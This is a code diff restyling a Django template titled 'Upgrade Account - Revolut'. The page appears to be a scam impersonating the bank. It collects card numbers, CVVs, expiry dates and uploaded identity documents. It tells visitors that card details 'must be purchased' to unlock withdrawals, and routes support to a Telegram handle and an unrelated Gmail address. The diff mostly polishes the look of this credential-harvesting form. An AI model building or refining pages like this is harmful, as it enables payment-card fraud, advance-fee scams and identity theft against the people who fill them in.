@@ -4,33 +4,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Upgrade Account - Revolut</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="{% static 'img/IMG-20250820-WA0109.jpg' %}" rel="icon">
-    <!-- With this: -->
-<link rel="icon" type="image/png" sizes="32x32" href="{% static 'images/blue-32x32.png' %}">
-<link rel="icon" type="image/png" sizes="16x16" href="{% static 'images/blue-16x16.png' %}">
-<link rel="shortcut icon" href="{% static 'images/favicon.ico' %}" type="image/x-icon">
-<link rel="apple-touch-icon" href="{% static 'images/blue-180x180.png' %}">
-<link rel="manifest" href="{% static 'manifest.json' %}">
-<meta name="theme-color" content="#0a3ee3">
+    <!-- Favicons -->
+    <link rel="icon" type="image/png" sizes="32x32" href="{% static 'images/blue-32x32.png' %}">
+    <link rel="icon" type="image/png" sizes="16x16" href="{% static 'images/blue-16x16.png' %}">
+    <link rel="shortcut icon" href="{% static 'images/favicon.ico' %}" type="image/x-icon">
+    <link rel="apple-touch-icon" href="{% static 'images/blue-180x180.png' %}">
+    <link rel="manifest" href="{% static 'manifest.json' %}">
+    <meta name="theme-color" content="#0a3ee3">
+    <!-- JivoSite Chat -->
     <script src="//code.jivosite.com/widget/U73k9r5PsR" async></script>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&family=Source+Sans+Pro:wght@300;400;600&display=swap" rel="stylesheet">
+    <!-- Fonts & Icons -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-    <title>Upgrade Account - Revolut</title>
+
     <style>
+        /* ============================================================
+               REVOLUT MODERN DARK UI — UPGRADE ACCOUNT
+               Consistent with bank, crypto, PayPal, pending, etc.
+               ============================================================ */
         :root {
-            --light-blue: #000000;
-            --primary-blue: #ffffff;
-            --dark-blue: #ffffff;
-            --accent-blue: #a3a3a3;
-            --soft-gray: #000000;
-            --medium-gray: rgba(255, 255, 255, 0.1);
-            --text-dark: #ffffff;
-            --text-light: #9ca3af;
-            --success: #27AE60;
-            --warning: #E67E22;
-            --error: #E74C3C;
+            --bg-primary: #0b0b0f;
+            --bg-secondary: #14141a;
+            --bg-card: #1a1a24;
+            --bg-input: #1e1e2a;
+            --bg-input-focus: #28283a;
+            --text-primary: #f1f3f7;
+            --text-secondary: #a8b0c8;
+            --text-muted: #6a7290;
+            --border-subtle: rgba(255, 255, 255, 0.06);
+            --border-focus: rgba(255, 255, 255, 0.18);
+            --accent-blue: #2b7aff;
+            --accent-glow: rgba(43, 122, 255, 0.25);
+            --success: #2ecc71;
+            --warning: #f39c12;
+            --error: #e74c3c;
+            --radius-sm: 8px;
+            --radius-md: 14px;
+            --radius-lg: 20px;
+            --shadow-card: 0 12px 40px rgba(0, 0, 0, 0.55);
+            --shadow-input: 0 0 0 3px rgba(43, 122, 255, 0.12);
+            --transition-fast: 0.15s ease;
+            --transition-med: 0.25s ease;
         }
 
         * {
@@ -40,61 +58,80 @@
         }
 
         body {
-            font-family: 'Source Sans Pro', sans-serif;
-            background: linear-gradient(135deg, var(--light-blue) 0%, var(--soft-gray) 100%);
-            color: var(--text-dark);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
             min-height: 100vh;
             line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
         }
 
-        /* Header Styling */
+        /* ====== NAVBAR ====== */
         .navbar {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            padding: 15px 0;
-            border-bottom: 1px solid var(--medium-gray);
-            box-shadow: 0 2px 15px rgba(42, 110, 187, 0.1);
+            background: rgba(11, 11, 15, 0.88);
+            backdrop-filter: blur(16px) saturate(1.2);
+            -webkit-backdrop-filter: blur(16px) saturate(1.2);
+            padding: 14px 0;
+            border-bottom: 1px solid var(--border-subtle);
         }
 
         .navbar-brand {
-            font-family: 'Montserrat', sans-serif;
+            font-family: 'Inter', sans-serif;
             font-weight: 700;
-            color: var(--dark-blue);
+            color: var(--text-primary);
             font-size: 1.5rem;
+            letter-spacing: -0.3px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .navbar-brand .brand-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--accent-blue);
+            box-shadow: 0 0 12px var(--accent-glow);
         }
 
         .navbar-brand::after {
-            content: "";
-            display: block;
-            width: 40px;
-            height: 3px;
-            background: var(--primary-blue);
-            margin-top: 5px;
-            border-radius: 2px;
+            display: none; /* remove old underline style */
+        }
+
+        .navbar-toggler {
+            border-color: var(--border-subtle);
+            color: var(--text-secondary);
+        }
+        .navbar-toggler-icon {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%23a8b0c8' viewBox='0 0 30 30'%3E%3Cpath stroke='%23a8b0c8' stroke-linecap='round' stroke-miterlimit='10' stroke-width='2' d='M4 7h22M4 15h22M4 23h22'/%3E%3C/svg%3E");
         }
 
         .nav-link {
-            color: var(--text-dark);
+            color: var(--text-secondary) !important;
             font-weight: 500;
-            transition: all 0.3s ease;
-            margin: 0 10px;
-            font-family: 'Montserrat', sans-serif;
+            font-size: 0.95rem;
+            transition: var(--transition-fast);
+            padding: 8px 16px !important;
+            border-radius: var(--radius-sm);
+            font-family: 'Inter', sans-serif;
         }
 
         .nav-link:hover {
-            color: var(--primary-blue);
+            color: var(--text-primary) !important;
+            background: rgba(255, 255, 255, 0.05);
         }
 
-        /* Main Container */
+        /* ====== MAIN CONTAINER (CARD) ====== */
         .upgrade-container {
             max-width: 650px;
-            margin: 40px auto;
-            background: rgba(255, 255, 255, 0.95);
+            margin: 50px auto;
+            background: var(--bg-card);
             backdrop-filter: blur(10px);
-            border-radius: 16px;
-            box-shadow: 0 15px 35px rgba(42, 110, 187, 0.15);
-            padding: 40px;
-            border: 1px solid var(--medium-gray);
+            border-radius: var(--radius-lg);
+            box-shadow: var(--shadow-card);
+            padding: 44px 44px 48px;
+            border: 1px solid var(--border-subtle);
             position: relative;
             overflow: hidden;
             animation: fadeInUp 0.8s ease-out;
@@ -106,8 +143,14 @@
             top: 0;
             left: 0;
             width: 100%;
-            height: 5px;
-            background: linear-gradient(90deg, var(--primary-blue) 0%, var(--accent-blue) 100%);
+            height: 4px;
+            background: linear-gradient(90deg, var(--accent-blue), #6c5ce7);
+            animation: colorFlow 3s ease-in-out infinite;
+        }
+
+        @keyframes colorFlow {
+            0%, 100% { background: linear-gradient(90deg, var(--accent-blue), #6c5ce7); }
+            50% { background: linear-gradient(90deg, #6c5ce7, var(--accent-blue)); }
         }
 
         @keyframes fadeInUp {
@@ -122,11 +165,12 @@
         }
 
         .upgrade-container h2 {
-            color: var(--dark-blue);
-            font-family: 'Montserrat', sans-serif;
-            font-weight: 600;
+            color: var(--text-primary);
+            font-family: 'Inter', sans-serif;
+            font-weight: 700;
             font-size: 2rem;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
             position: relative;
             padding-bottom: 15px;
         }
@@ -138,23 +182,24 @@
             left: 0;
             width: 80px;
             height: 3px;
-            background: var(--primary-blue);
+            background: var(--accent-blue);
             border-radius: 2px;
         }
 
         .upgrade-container > p {
-            color: var(--text-light);
+            color: var(--text-secondary);
             margin-bottom: 25px;
-            font-size: 1.1rem;
+            font-size: 1.05rem;
+            margin-top: 12px;
         }
 
-        /* Info Note */
+        /* ====== INFO NOTE ====== */
         .info-note {
-            background: rgba(230, 126, 34, 0.1);
-            color: var(--text-dark);
-            padding: 15px;
-            margin-bottom: 25px;
-            border-radius: 8px;
+            background: rgba(243, 156, 18, 0.06);
+            color: var(--text-secondary);
+            padding: 16px 20px;
+            margin-bottom: 28px;
+            border-radius: var(--radius-sm);
             border-left: 4px solid var(--warning);
             font-size: 0.95rem;
         }
@@ -163,36 +208,55 @@
             color: var(--warning);
         }
 
-        /* Form Styling */
+        /* ====== FORM ELEMENTS ====== */
         .form-group {
-            margin-bottom: 25px;
+            margin-bottom: 24px;
         }
 
         .form-label {
             font-weight: 600;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             display: block;
-            color: var(--dark-blue);
-            font-size: 1rem;
-            font-family: 'Montserrat', sans-serif;
+            color: var(--text-secondary);
+            font-size: 0.82rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-family: 'Inter', sans-serif;
         }
 
         .form-control, .form-select {
             width: 100%;
             padding: 14px 16px;
-            border: 1px solid var(--medium-gray);
-            border-radius: 8px;
-            font-size: 16px;
-            transition: all 0.3s ease;
-            background: rgba(255, 255, 255, 0.03);
-            font-family: 'Source Sans Pro', sans-serif;
+            background: var(--bg-input);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-sm);
+            font-size: 1rem;
+            color: var(--text-primary);
+            transition: var(--transition-fast);
+            font-family: 'Inter', sans-serif;
+            appearance: none;
         }
 
-        .form-control:focus, .form-select:focus {
+        .form-control::placeholder,
+        .form-select::placeholder {
+            color: var(--text-muted);
+            opacity: 0.7;
+        }
+
+        .form-control:focus,
+        .form-select:focus {
             outline: none;
-            border-color: var(--primary-blue);
-            box-shadow: 0 0 0 3px rgba(42, 110, 187, 0.15);
-            background: rgba(255, 255, 255, 0.03);
+            border-color: var(--accent-blue);
+            background: var(--bg-input-focus);
+            box-shadow: var(--shadow-input);
+        }
+
+        .form-select {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%236a7290' viewBox='0 0 16 16'%3E%3Cpath d='M8 11L3 6h10z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            background-size: 12px;
+            padding-right: 40px;
         }
 
         .expiry-container {
@@ -204,63 +268,81 @@
             flex: 1;
         }
 
-        /* Alert Styling */
-        .alert {
-            border-radius: 8px;
-            border: none;
-            padding: 15px;
-            margin-bottom: 25px;
+        .text-muted {
+            color: var(--text-muted) !important;
+            font-size: 0.8rem;
+            margin-top: 4px;
+            display: block;
         }
 
-        .alert-danger {
-            background: rgba(231, 76, 60, 0.1);
-            color: var(--error);
+        /* ====== ALERT (error messages) ====== */
+        .alert {
+            border-radius: var(--radius-sm);
+            border: none;
+            padding: 15px 18px;
+            margin-bottom: 25px;
+            background: rgba(231, 76, 60, 0.08);
+            color: #f5b0a0;
             border-left: 4px solid var(--error);
         }
 
-        /* Submit Button */
+        .alert p {
+            margin: 0;
+        }
+
+        /* ====== SUBMIT BUTTON ====== */
         .submit-btn {
             width: 100%;
-            padding: 16px;
+            padding: 16px 20px;
             border: none;
-            border-radius: 8px;
-            background: linear-gradient(135deg, var(--primary-blue) 0%, var(--accent-blue) 100%);
-            color: white;
+            border-radius: var(--radius-sm);
+            background: linear-gradient(135deg, var(--accent-blue), #5a7cff);
+            color: #fff;
             font-weight: 600;
-            font-size: 1.1rem;
+            font-size: 1.05rem;
+            font-family: 'Inter', sans-serif;
             cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 15px rgba(42, 110, 187, 0.25);
-            margin-top: 10px;
-            font-family: 'Montserrat', sans-serif;
+            transition: var(--transition-med);
+            box-shadow: 0 4px 20px rgba(43, 122, 255, 0.25);
+            margin-top: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
 
         .submit-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(42, 110, 187, 0.35);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(43, 122, 255, 0.35);
+            background: linear-gradient(135deg, #3b8aff, #6a8aff);
+            color: #fff;
         }
 
         .submit-btn:active {
-            transform: translateY(0);
+            transform: scale(0.98);
         }
 
-        /* Success Popup */
+        .submit-btn i {
+            font-size: 1rem;
+        }
+
+        /* ====== SUCCESS POPUP ====== */
         .success-popup {
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background: rgba(255, 255, 255, 0.98);
-            backdrop-filter: blur(10px);
-            border-radius: 16px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+            background: var(--bg-card);
+            backdrop-filter: blur(16px);
+            border-radius: var(--radius-lg);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
             display: none;
-            padding: 30px;
+            padding: 36px 32px 32px;
             text-align: center;
             max-width: 400px;
             width: 90%;
             z-index: 1000;
-            border: 1px solid var(--medium-gray);
+            border: 1px solid var(--border-subtle);
             animation: fadeInUp 0.5s ease-out;
         }
 
@@ -270,37 +352,97 @@
 
         .popup-content h2 {
             color: var(--success);
+            margin-bottom: 12px;
+            font-family: 'Inter', sans-serif;
+            font-weight: 700;
+        }
+
+        .popup-content p {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+        }
+
+        .popup-content i {
+            font-size: 3rem;
+            color: var(--success);
             margin-bottom: 15px;
-            font-family: 'Montserrat', sans-serif;
         }
 
         .close-popup {
             background: none;
             border: none;
             font-size: 1.5rem;
-            font-weight: bold;
-            color: var(--text-light);
+            font-weight: 300;
+            color: var(--text-muted);
             position: absolute;
-            top: 15px;
-            right: 15px;
+            top: 14px;
+            right: 18px;
             cursor: pointer;
-            transition: color 0.3s ease;
+            transition: var(--transition-fast);
+            line-height: 1;
         }
 
         .close-popup:hover {
-            color: var(--text-dark);
+            color: var(--text-primary);
         }
 
-        @keyframes bounce {
-            0%, 100% {
-                transform: translateY(0);
-            }
-            50% {
-                transform: translateY(-10px);
-            }
+        /* ====== FLOATING SUPPORT BUTTONS ====== */
+        .float-btn {
+            position: fixed;
+            left: 24px;
+            z-index: 1000;
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            box-shadow: 0 6px 24px rgba(0, 0, 0, 0.5);
+            transition: var(--transition-med);
+        }
+        .float-btn:hover {
+            transform: scale(1.08) translateY(-2px);
+        }
+        .float-btn .tooltip {
+            position: absolute;
+            left: 68px;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            color: #fff;
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            font-weight: 500;
+            white-space: nowrap;
+            opacity: 0;
+            pointer-events: none;
+            transition: var(--transition-med);
+        }
+        .float-btn:hover .tooltip {
+            opacity: 1;
         }
 
-        /* Responsive Design */
+        .telegram-float {
+            bottom: 100px;
+            background: #0088cc;
+        }
+        .telegram-float .telegram-icon {
+            width: 28px;
+            height: 28px;
+            filter: brightness(0) invert(1);
+        }
+
+        .email-float {
+            bottom: 168px;
+            background: linear-gradient(135deg, #2b7aff, #5a7cff);
+        }
+        .email-float .email-icon {
+            color: #fff;
+            font-size: 1.4rem;
+        }
+
+        /* ====== RESPONSIVE ====== */
         @media (max-width: 768px) {
             .upgrade-container {
                 padding: 30px 20px;
@@ -309,7 +451,7 @@
             }
 
             .upgrade-container h2 {
-                font-size: 1.7rem;
+                font-size: 1.6rem;
             }
 
             .expiry-container {
@@ -317,432 +459,50 @@
                 gap: 10px;
             }
 
-
-
             .navbar-brand {
                 font-size: 1.3rem;
             }
-        }
-                .telegram-float {
-            position: fixed;
-            left: 20px;
-            bottom: 20px;
-            z-index: 1000;
-            animation: float 3s ease-in-out infinite;
-        }
 
-        .telegram-link {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 60px;
-            height: 60px;
-            background: #0088cc;
-            border-radius: 50%;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-            transition: all 0.3s ease;
-            text-decoration: none;
-        }
-
-        .telegram-link:hover {
-            background: #0077b5;
-            transform: scale(1.1);
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.4);
-        }
-
-        .telegram-icon {
-            width: 30px;
-            height: 30px;
-            filter: brightness(0) invert(1);
-        }
-
-        .telegram-tooltip {
-            position: absolute;
-            left: 70px;
-            background: rgba(0, 0, 0, 0.8);
-            color: white;
-            padding: 8px 12px;
-            border-radius: 4px;
-            font-size: 14px;
-            white-space: nowrap;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-            pointer-events: none;
-        }
-
-        .telegram-link:hover .telegram-tooltip {
-            opacity: 1;
-        }
-
-        @keyframes float {
-            0% {
-                transform: translateY(0);
+            .float-btn {
+                width: 48px;
+                height: 48px;
+                left: 14px;
             }
-            50% {
-                transform: translateY(-10px);
-            }
-            100% {
-                transform: translateY(0);
-            }
-        }
-
-
-        @media (max-width: 768px) {
             .telegram-float {
-                left: 10px;
-                bottom: 10px;
+                bottom: 80px;
             }
-
-            .telegram-link {
-                width: 50px;
-                height: 50px;
+            .email-float {
+                bottom: 140px;
             }
-
-            .telegram-icon {
-                width: 25px;
-                height: 25px;
-            }
-        }
-                .telegram-float {
-            position: fixed;
-            left: 20px;
-            bottom: 20px;
-            z-index: 1000;
-            animation: float 3s ease-in-out infinite;
-        }
-
-        .telegram-link {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 60px;
-            height: 60px;
-            background: #0088cc;
-            border-radius: 50%;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-            transition: all 0.3s ease;
-            text-decoration: none;
-        }
-
-        .telegram-link:hover {
-            background: #0077b5;
-            transform: scale(1.1);
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.4);
-        }
-
-        .telegram-icon {
-            width: 30px;
-            height: 30px;
-            filter: brightness(0) invert(1);
-        }
-
-        .telegram-tooltip {
-            position: absolute;
-            left: 70px;
-            background: rgba(0, 0, 0, 0.8);
-            color: white;
-            padding: 8px 12px;
-            border-radius: 4px;
-            font-size: 14px;
-            white-space: nowrap;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-            pointer-events: none;
-        }
-
-        .telegram-link:hover .telegram-tooltip {
-            opacity: 1;
-        }
-
-        @keyframes float {
-            0% {
-                transform: translateY(0);
-            }
-            50% {
-                transform: translateY(-10px);
-            }
-            100% {
-                transform: translateY(0);
+            .float-btn .tooltip {
+                display: none;
             }
         }
 
-        footer {
-            text-align: center;
-            margin-top: 40px;
-            padding: 20px;
-            color: #7f8c8d;
-            font-size: 0.9rem;
-        }
-
-        @media (max-width: 768px) {
-            .telegram-float {
-                left: 10px;
-                bottom: 10px;
+        @media (max-width: 480px) {
+            .upgrade-container h2 {
+                font-size: 1.3rem;
             }
-
-            .telegram-link {
-                width: 50px;
-                height: 50px;
+            .submit-btn {
+                font-size: 0.95rem;
+                padding: 14px 16px;
             }
-
-            .telegram-icon {
-                width: 25px;
-                height: 25px;
+            .form-control, .form-select {
+                font-size: 0.95rem;
+                padding: 12px 14px;
             }
         }
-           /* Email Support Section */
-    .email-support {
-        margin-top: 25px;
-        padding: 20px;
-        background: rgba(255, 255, 255, 0.7);
-        border-radius: 10px;
-        border: 1px solid #E1E8ED;
-        animation: fadeIn 0.8s ease-out 1.4s both;
-    }
-
-    .email-support p {
-        margin-bottom: 10px;
-        color: #2C3E50;
-        font-size: 1rem;
-    }
-
-    .email-link {
-        color: #2A6EBB;
-        font-weight: 600;
-        text-decoration: none;
-        font-size: 1.1rem;
-        transition: all 0.3s ease;
-        display: inline-block;
-        padding: 8px 16px;
-        border-radius: 6px;
-        background: rgba(42, 110, 187, 0.1);
-    }
-
-    .email-link:hover {
-        color: #1A4A7A;
-        background: rgba(42, 110, 187, 0.2);
-        transform: translateY(-2px);
-        text-decoration: none;
-    }
-
-    .support-note {
-        font-size: 0.9rem;
-        color: #7F8C8D;
-        margin-top: 10px;
-        font-style: italic;
-    }
-
-    @keyframes fadeIn {
-        from {
-            opacity: 0;
-        }
-        to {
-            opacity: 1;
-        }
-    }
-
-    /* Responsive Design */
-    @media (max-width: 768px) {
-        .email-support {
-            padding: 15px;
-        }
-
-        .email-link {
-            font-size: 1rem;
-            padding: 6px 12px;
-        }
-    }
-        .email-float {
-        position: fixed;
-        left: 20px;
-        bottom: 90px;
-        z-index: 1000;
-        animation: floatEmail 3s ease-in-out infinite;
-    }
-
-    .email-link {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        width: 60px;
-        height: 60px;
-        background: linear-gradient(135deg, #2A6EBB 0%, #4A90E2 100%);
-        border-radius: 50%;
-        box-shadow: 0 4px 10px rgba(42, 110, 187, 0.3);
-        transition: all 0.3s ease;
-        text-decoration: none;
-    }
-
-    .email-link:hover {
-        background: linear-gradient(135deg, #1A4A7A 0%, #2A6EBB 100%);
-        transform: scale(1.1);
-        box-shadow: 0 6px 15px rgba(42, 110, 187, 0.4);
-    }
-
-    .email-icon {
-        color: white;
-        font-size: 1.5rem;
-    }
-
-    .email-tooltip {
-        position: absolute;
-        left: 70px;
-        background: rgba(0, 0, 0, 0.8);
-        color: white;
-        padding: 8px 12px;
-        border-radius: 4px;
-        font-size: 14px;
-        white-space: nowrap;
-        opacity: 0;
-        transition: opacity 0.3s ease;
-        pointer-events: none;
-    }
-
-    .email-link:hover .email-tooltip {
-        opacity: 1;
-    }
-
-    @keyframes floatEmail {
-        0% {
-            transform: translateY(0);
-        }
-        50% {
-            transform: translateY(-8px);
-        }
-        100% {
-            transform: translateY(0);
-        }
-    }
-
-    @media (max-width: 768px) {
-        .email-float {
-            left: 10px;
-            bottom: 80px;
-        }
-
-        .email-link {
-            width: 50px;
-            height: 50px;
-        }
-
-        .email-icon {
-            font-size: 1.3rem;
-        }
-    }
-
-    
-        /* Sitewide Dark Mode Overrides to match Revolut Landing Page */
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
-        
-        body {
-            background: #000000 !important;
-            color: #ffffff !important;
-            font-family: 'Poppins', sans-serif !important;
-        }
-        .login-container, .account-card, .balance-card, .card, .modal-content, .transaction-card, .loan-card, .investment-card {
-            background: rgba(10, 10, 10, 0.85) !important;
-            border: 1px solid rgba(255, 255, 255, 0.08) !important;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6) !important;
-            color: #ffffff !important;
-        }
-        .bank-header {
-            background: rgba(0, 0, 0, 0.85) !important;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.08) !important;
-            color: #ffffff !important;
-        }
-        .bank-header h1, .bank-header h1 i {
-            color: #ffffff !important;
-        }
-        .nav-toggle {
-            background: rgba(255, 255, 255, 0.08) !important;
-            color: #ffffff !important;
-        }
-        .nav-sidebar {
-            background: linear-gradient(180deg, #050505 0%, #111111 100%) !important;
-            border-left: 1px solid rgba(255, 255, 255, 0.08) !important;
-        }
-        .sidebar-header {
-            background: rgba(255, 255, 255, 0.03) !important;
-        }
-        .account-number-section, .payment-icon, .info-box, .detail-row {
-            background: rgba(255, 255, 255, 0.03) !important;
-            border: 1px solid rgba(255, 255, 255, 0.08) !important;
-            color: #ffffff !important;
-        }
-        .account-number {
-            color: #ffffff !important;
-        }
-        .payment-label {
-            color: #9ca3af !important;
-        }
-        .form-control {
-            background: rgba(255, 255, 255, 0.03) !important;
-            border: 1px solid rgba(255, 255, 255, 0.1) !important;
-            color: #ffffff !important;
-        }
-        .form-control:focus {
-            background: rgba(255, 255, 255, 0.05) !important;
-            border-color: rgba(255, 255, 255, 0.3) !important;
-            color: #ffffff !important;
-            box-shadow: none !important;
-        }
-        .login-btn, .login-button, .btn-primary, .submit-btn, .btn-primary-3d, .btn-hero-primary {
-            background: #ffffff !important;
-            color: #000000 !important;
-            border: 1px solid #ffffff !important;
-        }
-        .login-btn:hover, .login-button:hover, .btn-primary:hover, .submit-btn:hover, .btn-primary-3d:hover, .btn-hero-primary:hover {
-            background: #e5e7eb !important;
-            color: #000000 !important;
-        }
-        .btn-outline-primary, .btn-secondary, .btn-outline-3d {
-            background: transparent !important;
-            color: #ffffff !important;
-            border: 1px solid rgba(255, 255, 255, 0.2) !important;
-        }
-        .btn-outline-primary:hover, .btn-secondary:hover, .btn-outline-3d:hover {
-            background: rgba(255, 255, 255, 0.08) !important;
-            border-color: rgba(255, 255, 255, 0.3) !important;
-        }
-        a {
-            color: #ffffff;
-        }
-        a:hover {
-            color: #d1d5db;
-        }
-        .login-image {
-            background: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.75)),
-                        url('https://images.unsplash.com/photo-1601597111158-2fceff292cdc?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1170&q=80') !important;
-        }
-        .security-notice {
-            background: rgba(255, 255, 255, 0.03) !important;
-            border-left: 4px solid #ffffff !important;
-            color: #9ca3af !important;
-        }
-        .security-notice i {
-            color: #ffffff !important;
-        }
-        .logo-icon {
-            background: #ffffff !important;
-        }
-        .logo-icon i {
-            color: #000000 !important;
-        }
-        .logo-text {
-            color: #ffffff !important;
-        }
-        .login-form-container {
-            background: #09090b !important;
-            color: #ffffff !important;
-        }
-
-</style>
+    </style>
 </head>
 <body>
 
+    <!-- ====== NAVBAR ====== -->
     <nav class="navbar navbar-expand-md">
         <div class="container">
-            <a href="/" class="navbar-brand">Revolut</a>
+            <a href="/" class="navbar-brand">
+                <span class="brand-dot"></span>
+                Revolut
+            </a>
             <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#main-nav">
                 <span class="navbar-toggler-icon"></span>
             </button>
@@ -756,6 +516,7 @@
         </div>
     </nav>
 
+    <!-- ====== MAIN CARD ====== -->
     <div class="upgrade-container">
         <h2>Upgrade Your Account</h2>
         <p>Please provide your credentials to complete the upgrade process.</p>
@@ -765,33 +526,34 @@
             <p><strong>Important:</strong> The card details must be purchased in order to upgrade your account and unlock withdrawal features.</p>
         </div>
 
-        <!-- Error or Success Messages -->
+        <!-- Error Messages -->
         {% if messages %}
-            <div class="alert alert-danger" role="alert">
+            <div class="alert" role="alert">
                 {% for message in messages %}
                     <p>{{ message }}</p>
                 {% endfor %}
             </div>
         {% endif %}
 
+        <!-- ====== FORM ====== -->
         <form id="upgradeForm" action="{% url 'Upgrade_Account' %}" method="post" enctype="multipart/form-data">
             {% csrf_token %}
 
             <!-- Mobile Bank Card Number -->
             <div class="form-group">
-                <label for="card-number" class="form-label">Mobile Bank Card Number:</label>
+                <label for="card-number" class="form-label">Mobile Bank Card Number</label>
                 <input type="text" id="card-number" name="card_number" class="form-control" placeholder="Enter your card number" required>
             </div>
 
             <!-- CVV -->
             <div class="form-group">
-                <label for="cvv" class="form-label">CVV:</label>
+                <label for="cvv" class="form-label">CVV</label>
                 <input type="text" id="cvv" name="cvv" class="form-control" placeholder="Enter CVV" required>
             </div>
 
-            <!-- Expiration Date (Month and Year) -->
+            <!-- Expiration Date -->
             <div class="form-group">
-                <label for="expiry-month" class="form-label">Expiration Date:</label>
+                <label class="form-label">Expiration Date</label>
                 <div class="expiry-container">
                     <select id="expiry-month" name="expiry_month" class="form-select" required>
                         <option value="" disabled selected>Month</option>
@@ -808,12 +570,12 @@
                 </div>
             </div>
 
-            <!-- Hidden field for the combined expiry date -->
+            <!-- Hidden combined expiry -->
             <input type="hidden" id="expiry_date" name="expiry_date" required>
 
             <!-- Document Type -->
             <div class="form-group">
-                <label for="document-type" class="form-label">Document Type:</label>
+                <label for="document-type" class="form-label">Document Type</label>
                 <select id="document-type" name="document_type" class="form-select" required>
                     <option value="" disabled selected>Select document type</option>
                     <option value="driver_license">Driver License</option>
@@ -824,70 +586,79 @@
 
             <!-- Document Upload -->
             <div class="form-group">
-                <label for="document-upload" class="form-label">Upload Document:</label>
+                <label for="document-upload" class="form-label">Upload Document</label>
                 <input type="file" id="document-upload" name="document_upload" class="form-control" accept=".pdf,.jpg,.jpeg,.png" required>
                 <small class="text-muted">Accepted formats: PDF, JPG, JPEG, PNG</small>
             </div>
 
-            <!-- Submit Button -->
+            <!-- Submit -->
             <button type="submit" class="submit-btn">
-                <i class="fas fa-arrow-up" style="margin-right: 8px;"></i>
+                <i class="fas fa-arrow-up"></i>
                 Upgrade Account
             </button>
         </form>
     </div>
 
-    <!-- Success Popup -->
+    <!-- ====== SUCCESS POPUP ====== -->
     <div class="success-popup" id="successPopup">
         <button class="close-popup" onclick="closePopup()">&times;</button>
         <div class="popup-content">
-            <i class="fas fa-check-circle" style="font-size: 3rem; color: var(--success); margin-bottom: 15px;"></i>
+            <i class="fas fa-check-circle"></i>
             <h2>Upgrade Successful!</h2>
             <p>Your account upgrade request has been submitted successfully. Our team will review your information and activate your account shortly.</p>
         </div>
     </div>
 
- 
+    <!-- ====== FLOATING SUPPORT BUTTONS ====== -->
+    <!-- Telegram -->
+    <a href="https://t.me/Financial_Services_Team" class="float-btn telegram-float" target="_blank" rel="noopener" aria-label="Telegram support">
+        <svg class="telegram-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M22.5 2.5L1.5 10.5L8.5 14.5L17.5 7.5L10.5 15.5L13.5 22.5L22.5 2.5Z" stroke="white" stroke-width="1.8" stroke-linejoin="round"/>
+            <path d="M10.5 15.5L8.5 20.5L5.5 14.5" stroke="white" stroke-width="1.8" stroke-linejoin="round"/>
+        </svg>
+        <span class="tooltip">Telegram Support</span>
+    </a>
 
+    <!-- Email -->
+    <a href="mailto:axiscapitaltrustbank@gmail.com" class="float-btn email-float" aria-label="Email support">
+        <i class="fas fa-envelope email-icon"></i>
+        <span class="tooltip">Email Support</span>
